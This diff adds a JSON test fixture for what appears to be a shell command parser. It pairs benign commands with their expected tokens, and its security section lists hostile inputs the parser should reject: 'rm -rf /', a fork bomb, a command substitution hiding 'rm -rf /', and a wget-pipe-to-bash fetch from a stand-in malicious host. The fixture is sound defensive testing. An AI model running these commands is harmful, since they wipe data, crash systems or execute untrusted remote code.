@@ -1,0 +1,66 @@
+{
+  "functional": [
+    {
+      "input": "ls -la /home",
+      "expected_output": [
+        "ls",
+        "-la",
+        "/home"
+      ]
+    },
+    {
+      "input": "echo Hello, World!",
+      "expected_output": [
+        "echo",
+        "Hello,",
+        "World!"
+      ]
+    },
+    {
+      "input": "cp file.txt /usr/local/bin",
+      "expected_output": [
+        "cp",
+        "file.txt",
+        "/usr/local/bin"
+      ]
+    },
+    {
+      "input": "mkdir -p /new/dir",
+      "expected_output": [
+        "mkdir",
+        "-p",
+        "/new/dir"
+      ]
+    },
+    {
+      "input": "tar -xvf archive.tar.gz",
+      "expected_output": [
+        "tar",
+        "-xvf",
+        "archive.tar.gz"
+      ]
+    }
+  ],
+  "security": [
+    {
+      "input": "rm -rf /",
+      "expected_output": []
+    },
+    {
+      "input": "shutdown now",
+      "expected_output": []
+    },
+    {
+      "input": "|:(){ :|:& };:",
+      "expected_output": []
+    },
+    {
+      "input": "wget http://malicious-site.com/script.sh | bash",
+      "expected_output": []
+    },
+    {
+      "input": "echo $(rm -rf /)",
+      "expected_output": []
+    }
+  ]
+}
